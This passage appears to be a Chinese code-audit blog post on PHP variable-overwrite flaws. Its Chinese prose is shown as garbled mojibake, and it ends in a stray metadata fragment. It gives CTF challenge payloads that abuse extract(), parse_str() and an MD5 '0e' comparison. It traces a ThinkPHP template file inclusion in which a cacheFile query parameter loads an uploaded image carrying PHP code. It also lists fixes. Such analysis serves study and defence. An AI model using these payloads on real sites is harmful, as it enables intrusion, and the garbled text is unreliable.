ä¸¾ä¸ªä¾‹å­ï¼Œä»¥ä¸‹æƒ…å†µéå¸¸æœ‰ç”¨ï¼šå®šä¹‰ä¸€äº›æœ‰æ•ˆå˜é‡ï¼Œç„¶åä» $_REQUEST ä¸­ä»…å¯¼å…¥è¿™äº›å·²å®šä¹‰çš„å˜é‡ã€‚ EXTR_PREFIX_IF_EXISTSä»…åœ¨å½“å‰ç¬¦å·è¡¨ä¸­å·²æœ‰åŒåå˜é‡æ—¶ï¼Œå»ºç«‹é™„åŠ äº†å‰ç¼€çš„å˜é‡åï¼Œå…¶å®ƒçš„éƒ½ä¸å¤„ç†ã€‚ EXTR_REFSå°†å˜é‡ä½œä¸ºå¼•ç”¨æå–ã€‚è¿™æœ‰åŠ›åœ°è¡¨æ˜äº†å¯¼å…¥çš„å˜é‡ä»ç„¶å¼•ç”¨äº† array å‚æ•°çš„å€¼ã€‚å¯ä»¥å•ç‹¬ä½¿ç”¨è¿™ä¸ªæ ‡å¿—æˆ–è€…åœ¨ flags ä¸­ç”¨ OR ä¸å…¶å®ƒä»»ä½•æ ‡å¿—ç»“åˆä½¿ç”¨ã€‚ prefixæ³¨æ„ prefix ä»…åœ¨ flags çš„å€¼æ˜¯ EXTR_PREFIX_SAMEï¼ŒEXTR_PREFIX_ALLï¼ŒEXTR_PREFIX_INVALID æˆ– EXTR_PREFIX_IF_EXISTS æ—¶éœ€è¦ã€‚ å¦‚æœé™„åŠ äº†å‰ç¼€åçš„ç»“æœä¸æ˜¯åˆæ³•çš„å˜é‡åï¼Œå°†ä¸ä¼šå¯¼å…¥åˆ°ç¬¦å·è¡¨ä¸­ã€‚å‰ç¼€å’Œæ•°ç»„é”®åä¹‹é—´ä¼šè‡ªåŠ¨åŠ ä¸Šä¸€ä¸ªä¸‹åˆ’çº¿ã€‚ flags å‚æ•°é»˜è®¤ä¸º EXTR_OVERWRITEï¼Œå³å¦‚æœæœ‰å†²çªï¼Œè¦†ç›–å·²æœ‰çš„å˜é‡ è·å–flagï¼Œé¢˜ç›®1ï¼š 12345678910&lt;?phpextract($_GET); if(isset($mypwd))&#123; if($mypwd==$pwd) &#123; include(&quot;./flag&quot;); &#125;&#125;?&gt; extract($_GET); é»˜è®¤ä¸ºEXTR_OVERWRITEï¼Œå†²çªæ—¶è¦†ç›–å·²æœ‰å˜é‡ã€‚é€šè¿‡GETè¿›è¡Œä¼ å‚ã€‚ä»£ç çš„é€»è¾‘æ˜¯ï¼Œå¦‚æœè®¾ç½®äº†$mypwdï¼Œä¸” $mypwd&#x3D;&#x3D;$pwd æ—¶ï¼Œåˆ™å¯ä»¥è·å–flagã€‚æ‰€ä»¥$_getéƒ¨åˆ†è·å–åˆ°çš„æ˜¯ä¸€ä¸ªé”®å€¼å¯¹ã€‚ä¾‹å¦‚ï¼šmypwd&#x3D;&gt;1, pwd &#x3D;&gt;1 . extract($GET); çš„ç»“æœæ˜¯$mypwd&#x3D;1, $pwd&#x3D;1. . å³GETä¼ å…¥ pwd=1&amp;mypwd=1. é¢˜ç›®2ï¼š 1234567891011121314151617&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == â€œPOSTâ€) &#123; ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) &#123; ?&gt; &lt;div class=â€alert alert-successâ€&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php &#125; ?&gt;&lt;?php &#125; ?&gt; éœ€è¦æ„é€ POSTä¼ å‚ï¼Œä¸ºæ»¡è¶³$pass &#x3D;&#x3D; $thepassword_123ã€‚å¯ä»¥ä¼ ï¼špass=1&amp;thepassword_123=1. ï¼ˆåªè¦ä½¿ä½¿$pass == $thepassword_123å³å¯å¾—åˆ°flagï¼‰ parse_str() å‡½æ•°ä½¿ç”¨ä¸å½“parse_str() å‡½æ•°æŠŠå­—ç¬¦ä¸²è§£ææˆå¤šä¸ªå˜é‡ã€‚å…¶ä½œç”¨å°±æ˜¯è§£æå­—ç¬¦ä¸²å¹¶æ³¨å†Œæˆå˜é‡ï¼Œåœ¨æ³¨å†Œå˜é‡ä¹‹å‰ä¸ä¼šéªŒè¯å½“å‰å˜é‡æ˜¯å¦å­˜åœ¨ï¼Œæ‰€ä»¥ç›´æ¥è¦†ç›–æ‰å·²æœ‰å˜é‡ã€‚å½“ magic_quotes_gpc = Onï¼Œé‚£ä¹ˆåœ¨ parse_str() è§£æä¹‹å‰ï¼Œå˜é‡ä¼šè¢« addslashes() è½¬æ¢(ä¹Ÿå°±æ˜¯ä¼šè¢«è½¬ä¹‰ï¼ŒåŠ åæ–œçº¿)ã€‚ parse_str(string[,array])ï¼Œä¸¤ä¸ªå‚æ•°åˆ†åˆ«ä¸ºï¼š stringè¾“å…¥çš„å­—ç¬¦ä¸²ã€‚å¦‚æœ str æ˜¯ URL ä¼ é€’å…¥çš„æŸ¥è¯¢å­—ç¬¦ä¸²(query string)ï¼Œåˆ™å°†å®ƒè§£æä¸ºå˜é‡å¹¶è®¾ç½®åˆ°å½“å‰ä½œç”¨åŸŸ(å¦‚æœæä¾›äº† array åˆ™ä¼šè®¾ç½®åˆ°è¯¥æ•°ç»„é‡Œ)æ³¨æ„ï¼Œphp &gt;= 7.2ï¼Œå¦‚æœä¸è®¾ç½®è¯¥å‚æ•°ï¼Œè¯¥å‡½æ•°å°†å¤±æ•ˆ arrayä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœè®¾ç½®è¯¥å‚æ•°ï¼Œ å˜é‡å°†ä¼šä»¥æ•°ç»„å…ƒç´ çš„å½¢å¼å­˜å…¥åˆ°è¿™ä¸ªæ•°ç»„ï¼Œä½œä¸ºæ›¿ä»£ 12345678&lt;?php $str = &quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;; parse_str($str, $output); echo $output[&#x27;first&#x27;]; // value echo $output[&#x27;arr&#x27;][0]; // foo bar echo $output[&#x27;arr&#x27;][1]; // baz?&gt; é¢˜ç›®ï¼š 12345678910111213141516&lt;? phperror_reporting(0);if (empty($_GET[&#x27;id&#x27;])) &#123; show_source(__FILE__); die();&#125; else &#123; include(â€˜. / flag.phpâ€™); $a = â€œhttps: //www.cnblogs.com/wjrblogs/â€; $id = $_GET[&#x27;id&#x27;]; @parse_str($id); if ($a[0] != â€˜QNKCDZOâ€™ &amp;&amp; md5($a[0]) == md5(â€˜QNKCDZOâ€™)) &#123; echo $flag; &#125; else &#123; exit(â€˜å…¶å®å¾ˆç®€å•å…¶å®å¹¶ä¸éš¾ï¼â€™); &#125;&#125; ?&gt; é¦–å…ˆæ£€æŸ¥ URL ä¸­æ˜¯å¦æ²¡æœ‰ä¼ é€’ id å‚æ•°ï¼Œæˆ–è€…ä¼ é€’çš„ id å‚æ•°æ˜¯ä¸€ä¸ªç©ºå€¼ã€‚å¦‚æœæ˜¯çš„è¯ï¼Œæ˜¾ç¤ºæ–‡ä»¶çš„æºç ã€‚ @ ç¬¦å·ç”¨äºæŠ‘åˆ¶ä»»ä½•å¯èƒ½çš„é”™è¯¯æˆ–è­¦å‘Šæ¶ˆæ¯ã€‚@parse_str($id); ä¼šå¯¹ä¼ å…¥çš„å†…å®¹è¿›è¡Œå¤„ç†ï¼Œå°†å­—ç¬¦ä¸²è§£æä¸ºå˜é‡ã€‚ PHP Hashæ¯”è¾ƒå­˜åœ¨ç¼ºé™· ï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚è€Œè¿™é‡Œçš„ md5(â€˜QNKCDZOâ€™) çš„ç»“æœæ˜¯ 0e830400451993494058024219903391 ã€‚æ‰€ä»¥payloadä¸º ?id&#x3D;a[0]&#x3D;s878926199a ã€‚ import_request_variables() ä½¿ç”¨ä¸å½“ç‰ˆæœ¬è¦æ±‚ï¼šPHP 4 &gt;&#x3D; 4.1.0, PHP 5 &lt; 5.4.0 1bool import_request_variables ( string $types [, string $prefix ] ) stringæŒ‡å®šå¯¼å…¥å“ªäº›å˜é‡ä¸ºå…¨å±€å˜é‡ï¼Œå¯ä»¥ç”¨å­—æ¯ Gã€P å’Œ C åˆ†åˆ«è¡¨ç¤ºå¯¼å…¥ GETã€POST å’Œ Cookie ä¸­çš„å˜é‡ã€‚è¿™äº›å­—æ¯ä¸åŒºåˆ†å¤§å°å†™ï¼Œæ‰€ä»¥ä½ å¯ä»¥ä½¿ç”¨ gã€p å’Œ c çš„ä»»ä½•ç»„åˆã€‚POST åŒ…å«äº†é€šè¿‡ POST æ–¹æ³•ä¸Šä¼ çš„æ–‡ä»¶ä¿¡æ¯ã€‚æ³¨æ„è¿™äº›å­—æ¯çš„é¡ºåºï¼Œå½“ä½¿ç”¨ gp æ—¶ï¼ŒPOST å˜é‡å°†ä½¿ç”¨ç›¸åŒçš„åå­—è¦†ç›– GET å˜é‡ã€‚ä»»ä½• GPC ä»¥å¤–çš„å­—æ¯éƒ½å°†è¢«å¿½ç•¥ prefix$prefix å˜é‡åçš„å‰ç¼€ï¼Œç½®äºæ‰€æœ‰è¢«å¯¼å…¥åˆ°å…¨å±€ä½œç”¨åŸŸçš„å˜é‡ä¹‹å‰ã€‚æ‰€ä»¥å¦‚æœä½ æœ‰ä¸ªåä¸º userid çš„ GET å˜é‡ï¼ŒåŒæ—¶æä¾›äº† pref_ ä½œä¸ºå‰ç¼€ï¼Œé‚£ä¹ˆä½ å°†è·å¾—ä¸€ä¸ªåä¸º $pref_userid çš„å…¨å±€å˜é‡ã€‚è™½ç„¶ prefix å‚æ•°æ˜¯å¯é€‰çš„ï¼Œä½†å¦‚æœä¸æŒ‡å®šå‰ç¼€ï¼Œæˆ–è€…æŒ‡å®šä¸€ä¸ªç©ºå­—ç¬¦ä¸²ä½œä¸ºå‰ç¼€ï¼Œä½ å°†è·å¾—ä¸€ä¸ª E_NOTICE çº§åˆ«çš„é”™è¯¯ã€‚ 1234567&lt;?php// æ­¤å¤„å°†å¯¼å…¥ GET å’Œ POST å˜é‡// ä½¿ç”¨ runoob_ ä½œä¸ºå‰ç¼€import_request_variables(&quot;gP&quot;, &quot;runoob_&quot;); echo $runoob_foo;?&gt; ä¿®å¤ åœ¨php.iniæ–‡ä»¶ä¸­è®¾ç½®register_globals&#x3D;OFF ä½¿ç”¨åŸå§‹å˜é‡æ•°ç»„ï¼Œå¦‚$_POST,$_GETç­‰æ•°ç»„å˜é‡è¿›è¡Œæ“ä½œ ä¸ä½¿ç”¨foreachè¯­å¥æ¥éå†$_GETå˜é‡ï¼Œè€Œæ”¹ç”¨[(index)]æ¥æŒ‡å®š éªŒè¯å˜é‡æ˜¯å¦å­˜åœ¨ï¼Œæ³¨å†Œå˜é‡å‰å…ˆåˆ¤æ–­å˜é‡æ˜¯å¦å­˜åœ¨ é¢˜ç›®ï¼š 12345678&lt;? php$auth = &#x27;0&#x27;;import_request_variables(&#x27;G&#x27;);if ($auth == 1) &#123; echo &quot;ç™»é™†æˆåŠŸ&quot;;&#125; else &#123; echo &quot;ç™»é™†å¤±è´¥&quot;;&#125; ?&gt; import_request_variables(&#39;G&#39;);: è¿™æ˜¯ä¸€ä¸ªå°† GET è¯·æ±‚å‚æ•°å¯¼å…¥åˆ°å…¨å±€å‘½åç©ºé—´ä¸­çš„å‡½æ•°ã€‚&#39;G&#39; è¡¨ç¤ºåªå¯¼å…¥ GET è¯·æ±‚å‚æ•°ã€‚ è¿™æ„å‘³ç€ï¼Œå¦‚æœ URL ä¸­åŒ…å« auth å‚æ•°ï¼Œä¾‹å¦‚ example.com/script.php?auth=1ï¼Œè¯¥å‚æ•°çš„å€¼å°†è¦†ç›–ç°æœ‰çš„ $auth å˜é‡ã€‚ æ‰€ä»¥ç›´æ¥ä¼ å‚?auth=1 0X03 åŠ¨æ€è°ƒè¯•phpstudyåœ¨phpstudyä¸­ï¼Œå‹¾é€‰xdebugçš„PHPæ‰©å±•é€‰é¡¹ xdebug helper æ’ä»¶åœ¨æµè§ˆå™¨åº”ç”¨å•†åº—é‡Œå®‰è£…xdebug helperæ’ä»¶ï¼Œå¹¶è®¾ç½®IDE key phpstormè®¾ç½® é…ç½® ç«¯å£ä¸º thinkphp çš„web ç«¯å£ åœ¨phpstormä¸­æ‰“å¼€å°è™«å­ç›‘å¬ï¼Œåœ¨æµè§ˆå™¨ä¸­æŠŠæ’ä»¶ï¼Œé€‰æˆç»¿è‰²è™«å­çŠ¶æ€ï¼Œå¹¶åˆ·æ–°é¡µé¢ã€‚ åˆ·æ–°é¡µé¢åï¼Œä¼šè·³è½¬åˆ°phpstormé¡µé¢ï¼Œå¹¶æ˜¾ç¤ºå¦‚ä¸‹é¡µé¢ã€‚ è°ƒè¯•æˆåŠŸ æ‰¾åˆ°æ¼æ´å‡½æ•°&#x2F;æ¼æ´ç‚¹ï¼Œè°ƒå‡ºå®ƒçš„è°ƒç”¨é“¾ï¼Œç„¶åè¿›ä¸€æ­¥åˆ†æ åœ¨æ¼æ´ç‚¹å¤„æ‰“æ–­ç‚¹ xdebug helperï¼Œæµè§ˆå™¨é¡µé¢åˆ·æ–°ï¼Œè·³è½¬åˆ°phpstorm è¿›å…¥åŠ¨æ€è°ƒè¯• æŒ‰ç»¿è‰²å°ç®­å¤´ï¼Œè®©ç¨‹åºæ­£å¸¸è¿è¡Œï¼Œä¼šåœ¨æ–­ç‚¹å¤„åœä¸‹ï¼Œè¿™æ ·å°±å¯ä»¥æ‰¾åˆ°è°ƒç”¨é“¾äº†ã€‚ç„¶ååˆ†æä¸‹å»ã€‚ è°ƒè¯•è¿‡ç¨‹ä¸­æ€»æ˜¯ä¸­æ–­åœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­ï¼Œæ€»æ˜¯ä¸­æ–­å¹¶ä¸”æŠ¥500çš„é”™è¯¯ï¼ŒåŸå› æ˜¯ apache é»˜è®¤çš„è¿æ¥æ—¶é—´è¿‡çŸ­ï¼Œè°ƒè¯•æ—¶è¶…è¿‡äº†é»˜è®¤çš„è¿æ¥æ—¶é—´ã€‚ è§£å†³æ–¹æ¡ˆï¼šä¿®æ”¹phpstudyçš„apacheé…ç½®ï¼Œå¹¶é‡å¯apacheã€‚ 12FcgidIOTimeout 3000 FcgidConnectTimeout 3000 é…ç½®æ–‡ä»¶é‡Œä¸èƒ½æœ‰ä¸­æ–‡ 0X04 è¡¥ä¸åˆ†æ0X05 æ¼æ´åˆ†æè°ƒç”¨é“¾ æ¼æ´ç‚¹æ¼æ´æˆå› æ˜¯ç”±äº**flags å‚æ•°é»˜è®¤ä¸º EXTR_OVERWRITEï¼Œå³å¦‚æœæœ‰å†²çªï¼Œè¦†ç›–å·²æœ‰çš„å˜é‡** extract(array[,flag][,prefix])ï¼š arrayä¸€ä¸ªå…³è”æ•°ç»„(å¿…éœ€)ã€‚æ­¤å‡½æ•°ä¼šå°†é”®åå½“ä½œå˜é‡åï¼Œå€¼ä½œä¸ºå˜é‡çš„å€¼ã€‚ å¯¹æ¯ä¸ªé”®ï¼å€¼å¯¹éƒ½ä¼šåœ¨å½“å‰çš„ç¬¦å·è¡¨ä¸­å»ºç«‹å˜é‡ï¼Œå¹¶å—åˆ° flags å’Œ prefix å‚æ•°çš„å½±å“ã€‚å¿…é¡»ä½¿ç”¨å…³è”æ•°ç»„ï¼Œæ•°å­—ç´¢å¼•çš„æ•°ç»„å°†ä¸ä¼šäº§ç”Ÿç»“æœï¼Œé™¤éç”¨äº† EXTR_PREFIX_ALL æˆ–è€… EXTR_PREFIX_INVALIDã€‚ flagså¯¹å¾…éæ³•ï¼æ•°å­—å’Œå†²çªçš„é”®åçš„æ–¹æ³•å°†æ ¹æ®å–å‡ºæ ‡è®° flags å‚æ•°å†³å®šã€‚å¯ä»¥æ˜¯ä»¥ä¸‹å€¼ä¹‹ä¸€ï¼š EXTR_OVERWRITEå¦‚æœæœ‰å†²çªï¼Œè¦†ç›–å·²æœ‰çš„å˜é‡ã€‚(é»˜è®¤) å®‰å…¨çš„åšæ³•æ˜¯ç¡®å®šregister_globals&#x3D;OFFåï¼Œåœ¨è°ƒç”¨extract()æ—¶ä½¿ç”¨EXTR_SKIPä¿è¯å·²æœ‰å˜é‡ä¸ä¼šè¢«è¦†ç›–ã€‚ 12345678910public function read($cacheFile, $vars = [])&#123; $this-&gt;cacheFile = $cacheFile; if (!empty($vars) &amp;&amp; is_array($vars)) &#123; // æ¨¡æ¿é˜µåˆ—å˜é‡åˆ†è§£æˆä¸ºç‹¬ç«‹å˜é‡ extract($vars, EXTR_OVERWRITE); &#125; //è½½å…¥æ¨¡ç‰ˆç¼“å­˜æ–‡ä»¶ include $this-&gt;cacheFile;&#125; è¿™é‡Œè°ƒç”¨äº† extract($vars, EXTR_OVERWRITE);é‡‡ç”¨çš„æ˜¯è¦†ç›–å·²æœ‰å˜é‡çš„æ–¹å¼ã€‚å¯ä»¥é€šè¿‡åœ¨$varsé‡Œé¢ä¼ æ•°æ®çš„æ–¹å¼ï¼Œæ¥è¦†ç›–cacheFileè¿™ä¸ªå˜é‡ã€‚ indexæ–‡ä»¶ä¿®æ”¹éœ€è¦åœ¨æºæ–‡ä»¶çš„åŸºç¡€ä¸Šï¼Œä¿®æ”¹ application/index/controller/Index.php ä¸ºè§†å›¾æ¨¡æ¿ã€‚å¹¶ä¸”å¢åŠ ä¸€ä¸ªæ–‡ä»¶ application/index/view/index/index.htmlï¼ˆå†…å®¹å¯ä¸ºç©ºï¼Œåªéœ€æœ‰è¿™ä¸ªæ–‡ä»¶å³å¯ï¼‰ è¾“å‡ºæ›¿æ¢ - ThinkPHPå®˜æ–¹æ‰‹å†Œ 1234567891011&lt;?phpnamespace app\\index\\controller;use think\\Controller;class Index extends Controller&#123; public function index() &#123; $this-&gt;assign(request()-&gt;get()); return $this-&gt;fetch(); // å½“å‰æ¨¡å—/é»˜è®¤è§†å›¾ç›®å½•/å½“å‰æ§åˆ¶å™¨ï¼ˆå°å†™ï¼‰/å½“å‰æ“ä½œï¼ˆå°å†™ï¼‰.html &#125;&#125; æ¼æ´è·Ÿè¿› æ–­ç‚¹æ‰“åœ¨ $this-&gt;assign(request()-&gt;get()); ç„¶åç‚¹ step into ï¼Œä¸€æ­¥æ­¥è·Ÿè¿›ï¼Œçœ‹å‚æ•°éƒ½ç»è¿‡äº†å“ªäº›å¤„ç†ã€‚ ä» application/index/controller/Index.php ä¼ å‚ç‚¹è·Ÿè¿›ã€‚ 12345public function index() &#123; $this-&gt;assign(request()-&gt;get()); return $this-&gt;fetch(); // å½“å‰æ¨¡å—/é»˜è®¤è§†å›¾ç›®å½•/å½“å‰æ§åˆ¶å™¨ï¼ˆå°å†™ï¼‰/å½“å‰æ“ä½œï¼ˆå°å†™ï¼‰.html &#125; $this-&gt;assign(request()-&gt;get()); request()-&gt;get()ï¼šè·å–å½“å‰ HTTP è¯·æ±‚çš„æ‰€æœ‰ GET å‚æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ•°ç»„ã€‚ $this-&gt;assign()ï¼šé€šå¸¸ç”¨äºå°†æ•°æ®åˆ†é…åˆ°è§†å›¾ã€‚åœ¨ ThinkPHP ä¸­ï¼Œassign æ–¹æ³•å°†æ•°æ®åˆ†é…åˆ°æ¨¡æ¿å˜é‡ï¼Œä½¿å®ƒä»¬å¯ä»¥åœ¨è§†å›¾æ¨¡æ¿ä¸­ä½¿ç”¨ã€‚ return $this-&gt;fetch(); $this-&gt;fetch()ï¼šæ¸²æŸ“å¹¶è¿”å›è§†å›¾ã€‚æ ¹æ®æ³¨é‡Šï¼Œå®ƒä¼šé»˜è®¤åŠ è½½å½“å‰æ¨¡å—çš„è§†å›¾ç›®å½•ä¸‹ï¼Œå½“å‰æ§åˆ¶å™¨å’Œå½“å‰æ“ä½œå¯¹åº”çš„æ¨¡æ¿æ–‡ä»¶ã€‚ è·Ÿè¿›fetchå‡½æ•° 1234protected function fetch($template = &#x27;&#x27;, $vars = [], $replace = [], $config = [])&#123; return $this-&gt;view-&gt;fetch($template, $vars, $replace, $config);&#125; fetch éœ€è¦ä¼ å…¥ template æ¨¡æ¿ä¿¡æ¯å’Œæ¨¡æ¿å˜é‡ï¼ˆå³å½“å‰æ¨¡å—&#x2F;é»˜è®¤è§†å›¾ç›®å½•&#x2F;å½“å‰æ§åˆ¶å™¨ï¼ˆå°å†™ï¼‰&#x2F;å½“å‰æ“ä½œï¼ˆå°å†™ï¼‰.html application/index/view/index/index.htmlï¼‰ 12345678910111213141516public function fetch($template = &#x27;&#x27;, $vars = [], $replace = [], $config = [], $renderContent = false)&#123; ...... // æ¸²æŸ“è¾“å‡º try &#123; $method = $renderContent ? &#x27;display&#x27; : &#x27;fetch&#x27;; // å…è®¸ç”¨æˆ·è‡ªå®šä¹‰æ¨¡æ¿çš„å­—ç¬¦ä¸²æ›¿æ¢ $replace = array_merge($this-&gt;replace, $replace, (array) $this-&gt;engine-&gt;config(&#x27;tpl_replace_string&#x27;)); $this-&gt;engine-&gt;config(&#x27;tpl_replace_string&#x27;, $replace); $this-&gt;engine-&gt;$method($template, $vars, $config); &#125; catch (\\Exception $e) &#123; ob_end_clean(); throw $e; &#125; .....&#125; 1$method = $renderContent ? &#x27;display&#x27; : &#x27;fetch&#x27;; æ ¹æ® $renderContent çš„å€¼é€‰æ‹©è°ƒç”¨ display è¿˜æ˜¯ fetch æ–¹æ³•ã€‚display ç”¨äºç›´æ¥è¾“å‡ºå†…å®¹ï¼Œè€Œ fetch ç”¨äºè¿”å›æ¸²æŸ“åçš„å†…å®¹ã€‚ 1$this-&gt;engine-&gt;$method($template, $vars, $config); è°ƒç”¨æ¨¡æ¿å¼•æ“çš„ fetch æˆ– display æ–¹æ³•è¿›è¡Œæ¸²æŸ“ã€‚ ä»è°ƒç”¨é“¾é‡Œï¼Œçœ‹åˆ°æ˜¯è°ƒç”¨çš„fetchæ–¹æ³•ã€‚è·Ÿè¿›å¼•æ“ä¸­çš„think\\view\\driver\\Think-&gt;fetch()ã€‚ 123456789101112131415public function fetch($template, $data = [], $config = [])&#123; if (&#x27;&#x27; == pathinfo($template, PATHINFO_EXTENSION)) &#123; // è·å–æ¨¡æ¿æ–‡ä»¶å $template = $this-&gt;parseTemplate($template); &#125; // æ¨¡æ¿ä¸å­˜åœ¨ æŠ›å‡ºå¼‚å¸¸ if (!is_file($template)) &#123; throw new TemplateNotFoundException(&#x27;template not exists:&#x27; . $template, $template); &#125; // è®°å½•è§†å›¾ä¿¡æ¯ App::$debug &amp;&amp; Log::record(&#x27;[ VIEW ] &#x27; . $template . &#x27; [ &#x27; . var_export(array_keys($data), true) . &#x27; ]&#x27;, &#x27;info&#x27;); $this-&gt;template-&gt;fetch($template, $data, $config);&#125; 123456789101112131415161718192021222324252627282930313233343536373839public function fetch($template, $vars = [], $config = [])&#123; if ($vars) &#123; $this-&gt;data = $vars; &#125; if ($config) &#123; $this-&gt;config($config); &#125; if (!empty($this-&gt;config[&#x27;cache_id&#x27;]) &amp;&amp; $this-&gt;config[&#x27;display_cache&#x27;]) &#123; // è¯»å–æ¸²æŸ“ç¼“å­˜ $cacheContent = Cache::get($this-&gt;config[&#x27;cache_id&#x27;]); if (false !== $cacheContent) &#123; echo $cacheContent; return; &#125; &#125; $template = $this-&gt;parseTemplateFile($template); if ($template) &#123; $cacheFile = $this-&gt;config[&#x27;cache_path&#x27;] . $this-&gt;config[&#x27;cache_prefix&#x27;] . md5($this-&gt;config[&#x27;layout_name&#x27;] . $template) . &#x27;.&#x27; . ltrim($this-&gt;config[&#x27;cache_suffix&#x27;], &#x27;.&#x27;); if (!$this-&gt;checkCache($cacheFile)) &#123; // ç¼“å­˜æ— æ•ˆ é‡æ–°æ¨¡æ¿ç¼–è¯‘ $content = file_get_contents($template); $this-&gt;compiler($content, $cacheFile); &#125; // é¡µé¢ç¼“å­˜ ob_start(); ob_implicit_flush(0); // è¯»å–ç¼–è¯‘å­˜å‚¨ $this-&gt;storage-&gt;read($cacheFile, $this-&gt;data); // è·å–å¹¶æ¸…ç©ºç¼“å­˜ $content = ob_get_clean(); if (!empty($this-&gt;config[&#x27;cache_id&#x27;]) &amp;&amp; $this-&gt;config[&#x27;display_cache&#x27;]) &#123; // ç¼“å­˜é¡µé¢è¾“å‡º Cache::set($this-&gt;config[&#x27;cache_id&#x27;], $content, $this-&gt;config[&#x27;cache_time&#x27;]); &#125; echo $content; &#125;&#125; 12345678910public function read($cacheFile, $vars = [])&#123; if (!empty($vars) &amp;&amp; is_array($vars)) &#123; // æ¨¡æ¿é˜µåˆ—å˜é‡åˆ†è§£æˆä¸ºç‹¬ç«‹å˜é‡ extract($vars, EXTR_OVERWRITE); &#125; //è½½å…¥æ¨¡ç‰ˆç¼“å­˜æ–‡ä»¶ include $cacheFile;&#125; è°ƒç”¨requestå‡½æ•°çš„getå¯¹è±¡ï¼Œæ¥è¿›è¡Œä¼ å‚ã€‚ä¼ å…¥çš„æ•°æ®ï¼Œé€è¿›assignè¿›è¡Œå¤„ç†ã€‚ assign æ–¹æ³•é€šå¸¸ç”¨äº MVC æ¡†æ¶ä¸­çš„æ§åˆ¶å™¨ï¼ˆå¦‚ ThinkPHPï¼‰ï¼Œå°†æ•°æ®åˆ†é…åˆ°è§†å›¾ä¸­ï¼Œä½¿å…¶å¯ä»¥åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨æ•°æ®ã€‚ 123456789&gt;public function assign($name, $value = &#x27;&#x27;)&gt;&#123; if (is_array($name)) &#123; $this-&gt;data = array_merge($this-&gt;data, $name); &#125; else &#123; $this-&gt;data[$name] = $value; &#125; return $this;&gt;&#125; **$name**ï¼š å¯ä»¥æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–ä¸€ä¸ªæ•°ç»„ã€‚å¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™è¡¨ç¤ºè¦åˆ†é…åˆ°è§†å›¾ä¸­çš„å•ä¸ªå˜é‡åï¼›å¦‚æœæ˜¯æ•°ç»„ï¼Œåˆ™è¡¨ç¤ºè¦åˆ†é…åˆ°è§†å›¾ä¸­çš„å¤šä¸ªå˜é‡åå’Œå€¼çš„é”®å€¼å¯¹ã€‚ **$value**ï¼š è¿™æ˜¯å¯é€‰å‚æ•°ï¼Œé»˜è®¤ä¸ºç©ºå­—ç¬¦ä¸²ã€‚ä»…å½“ $name æ˜¯å­—ç¬¦ä¸²æ—¶æ‰ä½¿ç”¨ï¼Œè¡¨ç¤ºè¦åˆ†é…åˆ°è§†å›¾ä¸­çš„å˜é‡çš„å€¼ã€‚ å¦‚æœnameæ˜¯æ•°ç»„ï¼Œæ‰§è¡Œ array_merge æ“ä½œï¼Œå°† $name ä¸­çš„æ‰€æœ‰é”®å€¼å¯¹åˆå¹¶åˆ° $this-&gt;data ä¸­ã€‚å¦‚æœ $name ä¸æ˜¯æ•°ç»„ï¼ˆå³æ˜¯å­—ç¬¦ä¸²ï¼‰ï¼Œåˆ™å°† $value èµ‹å€¼ç»™ $this-&gt;data ä¸­å¯¹åº”çš„é”® $nameã€‚ ä¾‹å¦‚ï¼š 1234$this-&gt;data = [&#x27;a&#x27; =&gt; 1, &#x27;b&#x27; =&gt; 2];$name = [&#x27;b&#x27; =&gt; 3, &#x27;c&#x27; =&gt; 4];//æ‰§è¡Œ array_merge æ“ä½œ// ç»“æœï¼š$this-&gt;data = [&#x27;a&#x27; =&gt; 1, &#x27;b&#x27; =&gt; 3, &#x27;c&#x27; =&gt; 4]; å°† $value èµ‹å€¼ç»™ $this-&gt;data ä¸­å¯¹åº”çš„é”® $nameã€‚ 123$name = &#x27;d&#x27;;$value = 5;// ç»“æœï¼š$this-&gt;data[&#x27;d&#x27;] = 5; 0X06 POC æ„é€ 0X07 æ¼æ´å¤ç°åœ¨publicæ–‡ä»¶å¤¹ä¸‹ï¼Œæ”¾è¿›å»ä¸€ä¸ªå›¾ç‰‡é©¬ï¼ˆæ¨¡æ‹Ÿæ–‡ä»¶ä¸Šä¼ ï¼‰è®¿é—®/public/?cacheFile=xxxx.xxx å¯è§¦å‘æ¼æ´ã€‚æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä¸Šä¼ çš„æ–‡ä»¶ï¼Œä¸è®ºä»€ä¹ˆåç¼€ï¼Œéƒ½ä¼šè¢«è§£æã€‚ï¼ˆè§£æä¸ºphpæ–‡ä»¶ï¼‰ å›¾ç‰‡é©¬çš„åˆ¶ä½œï¼š ç”¨010 editorï¼Œç›´æ¥åœ¨æ–‡ä»¶åé¢åŠ å…¥phpä»£ç å³å¯ã€‚ç„¶åä¿å­˜ä¸ºå›¾ç‰‡æ ¼å¼ã€‚ 0X08 ä¿®å¤æ–¹æ¡ˆ0X09 å‚è€ƒæ–‡ç« PHP å˜é‡è¦†ç›–æ¼æ´ - 1ndex- - åšå®¢å›­ (cnblogs.com)","categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç 